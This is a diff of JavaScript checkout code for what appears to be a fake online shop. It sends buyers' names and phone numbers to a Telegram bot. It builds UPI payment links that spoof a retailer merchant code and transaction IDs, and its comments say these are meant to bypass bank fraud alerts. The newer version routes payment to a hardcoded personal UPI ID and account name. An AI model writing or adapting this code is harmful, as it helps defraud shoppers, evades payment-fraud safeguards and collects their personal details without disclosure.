@@ -550,27 +550,17 @@ init = function() {
         }
 
       async function confirmPay() {
-    const name = document.getElementById('uName').value;
-    const phone = document.getElementById('uPhone').value;
-    
-    // Telegram Alert Code (Wahi rehne dein jo aapka hai)
-    const msg = `🔥 *NEW ORDER ALERT* 🔥\n\n📦 *Item:* ${sel.name}\n💰 *Price:* ₹${sel.price}\n👤 *Name:* ${name}\n📞 *Phone:* ${phone}`;
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-    try { await fetch(url); } catch (e) {}
+    // 1. Sirf ID aur Name rakhein (Simple P2P payment)
+    const myUpi = "ravikantb114-2@okaxis";
+    const name = "Shashikant Kumar"; // Bank account name
 
-    // --- ALERT BYPASS LOGIC START ---
-    
-    // 1. Transaction ID: Har baar naya hona chahiye (Bohot zaroori)
-    const txnId = "FK" + Math.floor(Math.random() * 1000000000);
-    
-    // 2. Name Match: Agar bank account name 'Shashikant Kumar' hai, 
-    // toh 'pn' mein wahi hona chahiye ya usse milta julta.
-    const displayName = encodeURIComponent("Shashikant Kumar"); 
+    // 2. Link mein se 'am' (amount) aur 'mc' hata dein
+    // Isse PhonePe "Chat/Collect" wala screen kholega jahan user khud amount bhar sakega
+    const upiLink = `upi://pay?pa=${myUpi}&pn=${encodeURIComponent(name)}&cu=INR`;
 
-    // 3. The Bypass Link: 
-    // mc=5411 (Retailer category) - Isse bank system trust karta hai
-    // tr= txnId (Unique tracking) - Isse double payment ka alert nahi aata
-    const upiLink = `upi://pay?pa=${MY_UPI}&pn=${displayName}&am=${sel.price}&cu=INR&mc=5411&tr=${txnId}&mode=02&purpose=00`;
+    // 3. Telegram par alert bhej dein (taaki aapko pata chale kisne click kiya)
+    const msg = `🚀 *User clicked Pay*\n👤 Name: ${document.getElementById('uName').value}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
 
     // 4. Redirect
     window.location.href = upiLink;
